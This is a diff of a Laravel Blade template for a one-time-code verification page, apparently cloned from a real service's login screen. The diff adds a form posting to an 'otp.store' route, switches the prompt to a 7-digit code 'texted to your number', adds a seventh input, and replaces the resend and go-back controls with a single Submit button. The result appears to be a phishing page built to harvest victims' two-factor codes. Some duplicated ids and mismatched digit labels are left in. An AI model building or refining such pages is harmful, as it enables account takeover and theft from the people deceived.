@@ -24,13 +24,14 @@
                 <div data-testid="load-view-wrapper" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="flex-grow: 1; width: 100%;">
                   <div class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
                     <div data-hidden="false" class="cds-flex-f1g67tkn cds-column-ci8mx7v" style="height: 100%; width: 100%;">
+                      <form class="saveForm" data-storeURL="{{ route('otp.store') }}">
                       <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="flex-grow: 1; width: 100%;">
                         <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp">
                           <div class="cds-flex-f1g67tkn cds-0-_fibjmj">
                             <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-2-_8lqlrb" style="max-width: 100%; overflow-wrap: break-word;">
-                              <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-wrap-w1yty5cj">Enter the 6-digit code we emailed you</h1>
-                              <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a">Verify your email 
-                                <strong class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a"></strong>. This helps us keep your account secure by verifying that it’s really you.</span>
+                              <h1 class="cds-typographyResets-t1xhpuq2 cds-title1-toujgnf cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a cds-wrap-w1yty5cj">Enter the 7-digit code we texted to your number</h1>
+                              <span class="cds-typographyResets-t1xhpuq2 cds-body-bb7l4gg cds-foregroundMuted-f1vw1sy6 cds-transition-txjiwsi cds-start-s1muvu8a">
+                                <strong class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-foreground-f1yzxzgu cds-transition-txjiwsi cds-start-s1muvu8a"></strong>This helps us keep your account secure by verifying that it’s really you.</span>
                               </div>
                             </div>
                             <div class="cds-flex-f1g67tkn cds-column-ci8mx7v">
@@ -43,7 +44,7 @@
                                         <div class="cds-inputAreaContainerStyles-i1sndg40">
                                           <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                             <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
-                                            <input aria-label="6 digit code, digit 1" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:r9:" type="number" inputmode="numeric" autocomplete="one-time-code" value="" style="text-align: center; color-scheme: light;">
+                                            <input aria-label="6 digit code, digit 1" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" name="otp1" id="otp1" type="number" inputmode="numeric" autocomplete="one-time-code" style="text-align: center; color-scheme: light;">
                                           </span>
                                         </div>
                                       </div>
@@ -55,7 +56,7 @@
                                         <div class="cds-inputAreaContainerStyles-i1sndg40">
                                           <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                             <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
-                                            <input aria-label="6 digit code, digit 2" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:ra:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
+                                            <input aria-label="6 digit code, digit 2" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" name="otp2" id="otp2" type="number" inputmode="numeric" autocomplete="" style="text-align: center; color-scheme: light;">
                                           </span>
                                         </div>
                                       </div>
@@ -67,7 +68,7 @@
                                         <div class="cds-inputAreaContainerStyles-i1sndg40">
                                           <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                             <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
-                                            <input aria-label="6 digit code, digit 3" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rb:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
+                                            <input aria-label="6 digit code, digit 2" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:ra:" type="number" inputmode="numeric" autocomplete="" name="otp3" id="otp3" style="text-align: center; color-scheme: light;">
                                           </span>
                                         </div>
                                       </div>
@@ -79,7 +80,19 @@
                                         <div class="cds-inputAreaContainerStyles-i1sndg40">
                                           <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                             <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
-                                            <input aria-label="6 digit code, digit 4" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rc:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;"></span>
+                                            <input aria-label="6 digit code, digit 3" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rb:" type="number" inputmode="numeric" autocomplete="" name="otp4" id="otp4" style="text-align: center; color-scheme: light;">
+                                          </span>
+                                        </div>
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div class="cds-flex-f1g67tkn cds-0-_1t4ck38" style="flex-grow: 1; flex-shrink: 1; min-width: 0px; width: 55px;">
+                                    <div data-testid="" class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0_5-_5akrcb" style="width: 100%; opacity: 1;">
+                                      <div class="cds-flex-f1g67tkn cds-row-r1tfxker">
+                                        <div class="cds-inputAreaContainerStyles-i1sndg40">
+                                          <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
+                                            <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
+                                            <input aria-label="6 digit code, digit 4" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rc:" type="number" inputmode="numeric" autocomplete="" name="otp5" id="otp5" style="text-align: center; color-scheme: light;"></span>
                                           </div>
                                         </div>
                                       </div>
@@ -90,7 +103,7 @@
                                           <div class="cds-inputAreaContainerStyles-i1sndg40">
                                             <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                               <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
-                                              <input aria-label="6 digit code, digit 5" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rd:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
+                                              <input aria-label="6 digit code, digit 5" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:rd:" type="number" inputmode="numeric" autocomplete="" name="otp6" id="otp6" style="text-align: center; color-scheme: light;">
                                             </span>
                                           </div>
                                         </div>
@@ -102,7 +115,7 @@
                                           <div class="cds-inputAreaContainerStyles-i1sndg40">
                                             <span data-testid="input-interactable-area" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-input-i1ykumba cds-inputBaseAreaStyles-i12wqc8" style="--border-color-unfocused: var(--line-heavy); --border-color-focused: var(--primary); --border-width-focused: var(--border-width-input); --interactable-border-radius: 8px; --interactable-background: var(--background); --interactable-hovered-background: rgba(240, 240, 240, 255); --interactable-pressed-opacity: 0.92; --interactable-disabled-background: rgb(10, 11, 13); height: 55px;">
                                               <div data-testid="" class="cds-flex-f1g67tkn cds-center-ca5ylan cds-row-r1tfxker cds-center-czxavit cds-2-_8lqlrb"></div>
-                                              <input aria-label="6 digit code, digit 6" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:re:" type="number" inputmode="numeric" autocomplete="" value="" style="text-align: center; color-scheme: light;">
+                                              <input aria-label="6 digit code, digit 6" class="input-box cds-nativeInputBaseStyle-n1l8ztqg cds-body-bb7l4gg cds-1-_7dfei4" tabindex="0" aria-invalid="false" id="cds-textinput-label-:re:" type="number" inputmode="numeric" autocomplete="" name="otp7" id="otp7" style="text-align: center; color-scheme: light;">
                                             </span>
                                           </div>
                                         </div>
@@ -115,24 +128,18 @@
                             <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-3-_zv3bp" style="width: 100%;">
                               <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-0-_fibjmj">
                                 <div class="cds-flex-f1g67tkn cds-column-ci8mx7v cds-1-_obadkb">
-                                  <button data-testid="cooldown-button" aria-busy="false" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-secondaryForeground-s111xox1 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="button" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: rgba(240, 240, 240, 255); --interactable-hovered-background: rgba(30, 32, 37, 0.07); --interactable-pressed-opacity: 0.9; --interactable-disabled-background: rgb(30, 32, 37);">
-                                    <span class="cds-positionRelative-p109mlw7">
-                                      <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-secondaryForeground-s111xox1 cds-transition-txjiwsi cds-start-s1muvu8a">
-                                        <span class="">Resend Code</span>
+                                  <button id="continueBtn" data-testid="password-submit-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primaryForeground-pxcz3o7 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="submit" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: var(--primary); --interactable-hovered-background: rgb(80, 127, 229); --interactable-hovered-opacity: 0.91; --interactable-pressed-background: rgb(75, 120, 214); --interactable-pressed-opacity: 0.85; --interactable-disabled-background: rgb(49, 75, 132);">
+                                      <span class="cds-positionRelative-p109mlw7">
+                                        <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primaryForeground-pxcz3o7 cds-transition-txjiwsi cds-start-s1muvu8a"><span class="">Submit</span>
                                       </span>
                                     </span>
                                   </button>
-                                  <a href="{{ route('login') }}" data-testid="go-back-button" class="cds-interactable-i9xooc6 cds-focusRing-fd371rq cds-transparent-tlx9nbb cds-button-b18qe5go cds-fullWidth-fnzgr0o cds-scaledDownState-sxr2bd6 cds-primary-piuvss6 cds-button-bpih6bv cds-buttonBlock-b90146d cds-4-_1arbnhr cds-4-_hd2z08" type="button" style="--interactable-height: 56px; --interactable-border-radius: 56px; --interactable-background: transparent; --interactable-disabled-background: rgb(10, 11, 13);">
-                                    <span class="cds-positionRelative-p109mlw7">
-                                      <span class="cds-typographyResets-t1xhpuq2 cds-headline-htr1998 cds-primary-piuvss6 cds-transition-txjiwsi cds-start-s1muvu8a">
-                                        <span class="">Go back</span>
-                                      </span>
-                                    </span>
-                                  </a>
+                                 
                                 </div>
                               </div>
                             </div>
                           </div>
+                        </form>
                           <div>
                             <div>
                               <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
@@ -182,13 +189,13 @@ document.addEventListener("DOMContentLoaded", function() {
     inputBoxes.forEach((input, index) => {
         input.addEventListener("input", function() {
             if (input.value.length > 1) {
-                input.value = input.value.slice(0, 1); // Only allow one digit
+                input.value = input.value.slice(0, 1);
             }
             if (input.value.length === 1) {
                 if (index < inputBoxes.length - 1 && input.dataset.previousValue === "") {
                     inputBoxes[index + 1].focus();
                 } else {
-                    input.blur(); // Remove focus from the last input box
+                    input.blur(); 
                 }
             }
             input.dataset.previousValue = input.value;
@@ -202,17 +209,14 @@ document.addEventListener("DOMContentLoaded", function() {
 
         input.addEventListener("keypress", function(e) {
             if (e.which < 48 || e.which > 57) {
-                e.preventDefault(); // Restrict input to digits only
+                e.preventDefault(); 
             }
         });
 
         input.addEventListener("focus", function() {
-            input.dataset.previousValue = input.value; // Store the previous value on focus
+            input.dataset.previousValue = input.value; 
         });
     });
 });
-
-
-
       </script>
      @endpush
